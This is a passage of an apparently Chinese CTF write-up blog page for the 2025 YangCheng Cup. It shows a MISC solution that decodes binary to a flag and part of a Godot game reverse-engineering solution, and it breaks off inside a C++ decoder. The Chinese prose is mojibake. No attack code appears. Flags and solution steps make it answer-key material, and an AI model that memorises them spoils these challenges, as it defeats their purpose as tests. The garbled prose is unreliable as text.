<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="ç¾ŠåŸæ¯2025 Write UP\rè¢«é˜Ÿé‡Œçš„å¤©æ‰é€‰æ‰‹å¸¦é£äº†ï¼Œå¤ªå¼ºå¤§äº†ï¼ï¼ï¼\nè€Œæˆ‘é™¤äº†ç”¨AIå‡ºä¸€é“PHPååºåˆ—åŒ–ä¹‹å¤–æ¯«æ— è¾“å‡ºQaQ\nMISC\ræˆåŠŸç”·äººèƒŒåçš„å¥³äºº\ræ‰“å¼€é™„ä»¶å‘ç°æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œæ ¹æ®æç¤ºï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨éšè—çš„å›¾ç‰‡æˆ–è€…å…¶ä»–å†…å®¹ã€‚å°è¯•ä½¿ç”¨binwalkã€foremostéƒ½æ— æœã€‚æœ€åæŸ¥è¯¢èµ„æ–™å¯çŸ¥ç”¨äº†Adobe Fireworksä¸“æœ‰çš„åè®®ï¼Œå°è¯•æ‰“å¼€å³å¯å‘ç°éšè—å›¾åƒï¼š å°†å›¾åƒä¸‹æ–¹çš„ç¬¦å·æŒ‰ç…§äºŒè¿›åˆ¶çš„æ–¹å¼ç»„åˆå¾—åˆ°ï¼š\n">
<title>ç¾ŠåŸæ¯2025 Write UP</title>

<link rel='canonical' href='https://Oight.github.io/p/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-write-up/'>

<link rel="stylesheet" href="/scss/style.min.0e9b0dc41309ee439f307e94fe233ae09b70f32858267ed1afae44d0ba448205.css"><meta property='og:title' content="ç¾ŠåŸæ¯2025 Write UP">
<meta property='og:description' content="ç¾ŠåŸæ¯2025 Write UP\rè¢«é˜Ÿé‡Œçš„å¤©æ‰é€‰æ‰‹å¸¦é£äº†ï¼Œå¤ªå¼ºå¤§äº†ï¼ï¼ï¼\nè€Œæˆ‘é™¤äº†ç”¨AIå‡ºä¸€é“PHPååºåˆ—åŒ–ä¹‹å¤–æ¯«æ— è¾“å‡ºQaQ\nMISC\ræˆåŠŸç”·äººèƒŒåçš„å¥³äºº\ræ‰“å¼€é™„ä»¶å‘ç°æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œæ ¹æ®æç¤ºï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨éšè—çš„å›¾ç‰‡æˆ–è€…å…¶ä»–å†…å®¹ã€‚å°è¯•ä½¿ç”¨binwalkã€foremostéƒ½æ— æœã€‚æœ€åæŸ¥è¯¢èµ„æ–™å¯çŸ¥ç”¨äº†Adobe Fireworksä¸“æœ‰çš„åè®®ï¼Œå°è¯•æ‰“å¼€å³å¯å‘ç°éšè—å›¾åƒï¼š å°†å›¾åƒä¸‹æ–¹çš„ç¬¦å·æŒ‰ç…§äºŒè¿›åˆ¶çš„æ–¹å¼ç»„åˆå¾—åˆ°ï¼š\n">
<meta property='og:url' content='https://Oight.github.io/p/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-write-up/'>
<meta property='og:site_name' content='Oight'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-12T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="ç¾ŠåŸæ¯2025 Write UP">
<meta name="twitter:description" content="ç¾ŠåŸæ¯2025 Write UP\rè¢«é˜Ÿé‡Œçš„å¤©æ‰é€‰æ‰‹å¸¦é£äº†ï¼Œå¤ªå¼ºå¤§äº†ï¼ï¼ï¼\nè€Œæˆ‘é™¤äº†ç”¨AIå‡ºä¸€é“PHPååºåˆ—åŒ–ä¹‹å¤–æ¯«æ— è¾“å‡ºQaQ\nMISC\ræˆåŠŸç”·äººèƒŒåçš„å¥³äºº\ræ‰“å¼€é™„ä»¶å‘ç°æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œæ ¹æ®æç¤ºï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨éšè—çš„å›¾ç‰‡æˆ–è€…å…¶ä»–å†…å®¹ã€‚å°è¯•ä½¿ç”¨binwalkã€foremostéƒ½æ— æœã€‚æœ€åæŸ¥è¯¢èµ„æ–™å¯çŸ¥ç”¨äº†Adobe Fireworksä¸“æœ‰çš„åè®®ï¼Œå°è¯•æ‰“å¼€å³å¯å‘ç°éšè—å›¾åƒï¼š å°†å›¾åƒä¸‹æ–¹çš„ç¬¦å·æŒ‰ç…§äºŒè¿›åˆ¶çš„æ–¹å¼ç»„åˆå¾—åˆ°ï¼š\n">
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_37edead8cd3c258e.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ§</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Oight</a></h1>
            <h2 class="site-description">Talk is cheap. Show me the code.</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://space.bilibili.com/696224138'
                        target="_blank"
                        title="bilibili"
                        rel="me"
                    >
                        
                        
                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/Oight'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹æƒ…é“¾æ¥</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#misc">MISC</a>
      <ol>
        <li><a href="#æˆåŠŸç”·äººèƒŒåçš„å¥³äºº">æˆåŠŸç”·äººèƒŒåçš„å¥³äºº</a></li>
      </ol>
    </li>
    <li><a href="#reverse">Reverse</a>
      <ol>
        <li><a href="#gd1">GD1</a></li>
      </ol>
    </li>
    <li><a href="#ds">DS</a>
      <ol>
        <li><a href="#sm4-ofb">SM4-OFB</a></li>
        <li><a href="#dataidsort">dataIdSort</a></li>
      </ol>
    </li>
    <li><a href="#web">WEB</a>
      <ol>
        <li><a href="#ez_blog">ez_blog</a></li>
        <li><a href="#ez_unserialize">ez_unserialize</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/wp/" >
                WP
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-write-up/">ç¾ŠåŸæ¯2025 Write UP</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-10-12</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 17 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="ç¾ŠåŸæ¯2025-write-up">ç¾ŠåŸæ¯2025 Write UP
</h1><p>è¢«é˜Ÿé‡Œçš„å¤©æ‰é€‰æ‰‹å¸¦é£äº†ï¼Œå¤ªå¼ºå¤§äº†ï¼ï¼ï¼</p>
<p>è€Œæˆ‘é™¤äº†ç”¨AIå‡ºä¸€é“PHPååºåˆ—åŒ–ä¹‹å¤–æ¯«æ— è¾“å‡ºQaQ</p>
<h2 id="misc">MISC
</h2><h3 id="æˆåŠŸç”·äººèƒŒåçš„å¥³äºº">æˆåŠŸç”·äººèƒŒåçš„å¥³äºº
</h3><p>æ‰“å¼€é™„ä»¶å‘ç°æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œæ ¹æ®æç¤ºï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨éšè—çš„å›¾ç‰‡æˆ–è€…å…¶ä»–å†…å®¹ã€‚å°è¯•ä½¿ç”¨binwalkã€foremostéƒ½æ— æœã€‚æœ€åæŸ¥è¯¢èµ„æ–™å¯çŸ¥ç”¨äº†Adobe Fireworksä¸“æœ‰çš„åè®®ï¼Œå°è¯•æ‰“å¼€å³å¯å‘ç°éšè—å›¾åƒï¼š
å°†å›¾åƒä¸‹æ–¹çš„ç¬¦å·æŒ‰ç…§äºŒè¿›åˆ¶çš„æ–¹å¼ç»„åˆå¾—åˆ°ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">01000100010000010101001101000011
</span></span><span class="line"><span class="cl">01010100010001100111101101110111
</span></span><span class="line"><span class="cl">00110000011011010100010101001110
</span></span><span class="line"><span class="cl">01011111011000100110010101101000
</span></span><span class="line"><span class="cl">00110001011011100100010001011111
</span></span><span class="line"><span class="cl">01001101010001010110111001111101
</span></span></code></pre></td></tr></table>
</div>
</div><p>8ä¸ªä¸€ç»„è§£ç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">str</span><span class="o">=</span><span class="s">&#34;010001000100000101010011010000110101010001000110011110110111011100110000011011010100010101001110010111110110001001100101011010000011000101101110010001000101111101001101010001010110111001111101&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">str</span><span class="p">.</span><span class="n">length</span><span class="p">();</span><span class="n">i</span><span class="o">+=</span><span class="mi">8</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">stoi</span><span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="n">substr</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mi">8</span><span class="p">).</span><span class="n">c_str</span><span class="p">(),</span><span class="k">nullptr</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œå¾—åˆ°ï¼š<code>DASCTF{w0mEN_beh1nD_MEn}</code></p>
<h2 id="reverse">Reverse
</h2><h3 id="gd1">GD1
</h3><p>é€šè¿‡æ–‡ä»¶æè¿°å¯çŸ¥è¿™æ˜¯Godot Engineç¼–å†™çš„æ¸¸æˆã€‚ä½¿ç”¨GDREå·¥å…·æ‰“å¼€ï¼Œå¯æ‰¾åˆ°æ¸¸æˆé€»è¾‘ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">extends Node
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@export var mob_scene: PackedScene
</span></span><span class="line"><span class="cl">var score
</span></span><span class="line"><span class="cl">var a = &#34;000001101000000001100101000010000011000001100111000010000100000001110000000100100011000100100000000001100111000100010111000001100110000100000101000001110000000010001001000100010100000001000101000100010111000001010011000010010111000010000000000001010000000001000101000010000001000100000110000100010101000100010010000001110101000100000111000001000101000100010100000100000100000001001000000001110110000001111001000001000101000100011001000001010111000010000111000010010000000001010110000001101000000100000001000010000011000100100101&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">func _ready():
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    pass
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">func _process(delta: float) -&gt; void :
</span></span><span class="line"><span class="cl">    pass
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">func game_over():
</span></span><span class="line"><span class="cl">    $ScoreTimer.stop()
</span></span><span class="line"><span class="cl">    $MobTimer.stop()
</span></span><span class="line"><span class="cl">    $HUD.show_game_over()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">func new_game():
</span></span><span class="line"><span class="cl">    score = 0
</span></span><span class="line"><span class="cl">    $Player.start($StartPosition.position)
</span></span><span class="line"><span class="cl">    $StartTimer.start()
</span></span><span class="line"><span class="cl">    $HUD.update_score(score)
</span></span><span class="line"><span class="cl">    $HUD.show_message(&#34;Get Ready&#34;)
</span></span><span class="line"><span class="cl">    get_tree().call_group(&#34;mobs&#34;, &#34;queue_free&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">func _on_mob_timer_timeout():
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    var mob = mob_scene.instantiate()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    var mob_spawn_location = $MobPath / MobSpawnLocation
</span></span><span class="line"><span class="cl">    mob_spawn_location.progress_ratio = randf()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    var direction = mob_spawn_location.rotation + PI / 2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    mob.position = mob_spawn_location.position
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    direction += randf_range( - PI / 4, PI / 4)
</span></span><span class="line"><span class="cl">    mob.rotation = direction
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    var velocity = Vector2(randf_range(150.0, 250.0), 0.0)
</span></span><span class="line"><span class="cl">    mob.linear_velocity = velocity.rotated(direction)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    add_child(mob)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">func _on_score_timer_timeout():
</span></span><span class="line"><span class="cl">    score += 1
</span></span><span class="line"><span class="cl">    $HUD.update_score(score)
</span></span><span class="line"><span class="cl">    if score == 7906:
</span></span><span class="line"><span class="cl">        var result = &#34;&#34;
</span></span><span class="line"><span class="cl">        for i in range(0, a.length(), 12):
</span></span><span class="line"><span class="cl">            var bin_chunk = a.substr(i, 12)
</span></span><span class="line"><span class="cl">            var hundreds = bin_chunk.substr(0, 4).bin_to_int()
</span></span><span class="line"><span class="cl">            var tens = bin_chunk.substr(4, 4).bin_to_int()
</span></span><span class="line"><span class="cl">            var units = bin_chunk.substr(8, 4).bin_to_int()
</span></span><span class="line"><span class="cl">            var ascii_value = hundreds * 100 + tens * 10 + units
</span></span><span class="line"><span class="cl">            result += String.chr(ascii_value)
</span></span><span class="line"><span class="cl">        $HUD.show_message(result)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">func _on_start_timer_timeout():
</span></span><span class="line"><span class="cl">    $MobTimer.start()
</span></span><span class="line"><span class="cl">    $ScoreTimer.start()
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°å½“å¾—åˆ†åˆ°è¾¾7906æ—¶ä¼šè°ƒç”¨ä¸€ä¸ªè§£å¯†ç®—æ³•ï¼Œå°†æ•°ç»„<code>a</code>çš„æ•°æ®è§£å¯†ç„¶åæ‰“å°ã€‚å°è¯•æŒ‰ç…§é€»è¾‘ç¼–å†™è§£å¯†ç¨‹åºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;bitset&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">bin_to_int</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">bin</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">stoi</span><span class="p">(</span><span class="n">bin</span><span class="p">,</span> <span class="k">nullptr</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">string</span> <span class="nf">decodeBinaryString</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">&lt;=</span> <span class="n">a</span><span class="p">.</span><span class="n">length</span><span class="p">();</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">12</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">string</span> <span class="n">bin_chunk</span> <span class="o">=</span> <span class="n">a</span><span class="p">.</span><span class="n">substr</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
